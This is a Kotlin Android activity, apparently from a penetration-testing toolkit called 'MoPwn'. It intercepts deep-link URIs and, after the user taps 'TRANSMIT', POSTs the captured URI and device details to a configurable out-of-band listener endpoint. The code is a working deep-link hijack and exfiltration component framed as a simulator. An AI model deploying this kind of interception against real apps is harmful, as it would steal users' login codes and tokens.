package com.mopwn.app

import android.app.Activity
import android.app.AlertDialog
import android.content.SharedPreferences
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class DeeplinkHijackSimulatorActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Make the container window completely transparent to show only the dialog overlay
        window.decorView.setBackgroundColor(Color.TRANSPARENT)

        val incomingUri: Uri? = intent.data
        if (incomingUri == null) {
            finish()
            return
        }

        // Retrieve the configured endpoint URL from SharedPreferences
        val prefs: SharedPreferences = getSharedPreferences("MoPwnPrefs", MODE_PRIVATE)
        val defaultEndpoint = "http://127.0.0.1:1337/"
        val endpointUrl = prefs.getString("oob_logger_endpoint", defaultEndpoint)?.trim() ?: defaultEndpoint

        showInterceptDialog(incomingUri.toString(), endpointUrl)
    }

    private fun showInterceptDialog(uriStr: String, endpointUrl: String) {
        val dialogView = layoutInflater.inflate(android.R.layout.simple_list_item_2, null)
        val text1 = dialogView.findViewById<TextView>(android.R.id.text1)
        val text2 = dialogView.findViewById<TextView>(android.R.id.text2)

        text1.text = "Universal Link Intercepted"
        text2.text = "URI: $uriStr\n\nDestination OOB: $endpointUrl\n\nClick 'Transmit' to dispatch captured tokens to your active listener."

        AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
            .setTitle("MoPWN Hijack Simulator")
            .setView(dialogView)
            .setCancelable(false)
            .setPositiveButton("TRANSMIT") { dialog, _ ->
                transmitPayload(uriStr, endpointUrl)
                dialog.dismiss()
            }
            .setNegativeButton("DISCARD") { dialog, _ ->
                Toast.makeText(this, "Hijacked payload discarded.", Toast.LENGTH_SHORT).show()
                dialog.dismiss()
                finish()
            }
            .show()
    }

    private fun transmitPayload(uriStr: String, endpointUrl: String) {
        Thread {
            var connection: HttpURLConnection? = null
            try {
                val url = URL(endpointUrl)
                connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.doOutput = true
                connection.connectTimeout = 5000
                connection.readTimeout = 5000

                // Generate standard json diagnostic structure
                val payload = JSONObject().apply {
                    put("device", "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})")
                    put("intercepted_uri", uriStr)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = payload.toString()
                val os: OutputStream = connection.outputStream
                os.write(body.toByteArray())
                os.flush()
                os.close()

                val responseCode = connection.responseCode
                runOnUiThread {
                    if (responseCode in 200..299) {
                        Toast.makeText(this, "🟢 Transmit Successful! Code $responseCode", Toast.LENGTH_LONG).show()
                    } else {
                        Toast.makeText(this, "⚠️ Transmit Failed: HTTP Code $responseCode", Toast.LENGTH_LONG).show()
                    }
                    finish()
                }
            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(this, "🔴 Network Error: ${e.message}", Toast.LENGTH_LONG).show()
                    finish()
                }
            } finally {
                connection?.disconnect()
            }
        }.start()
    }
}
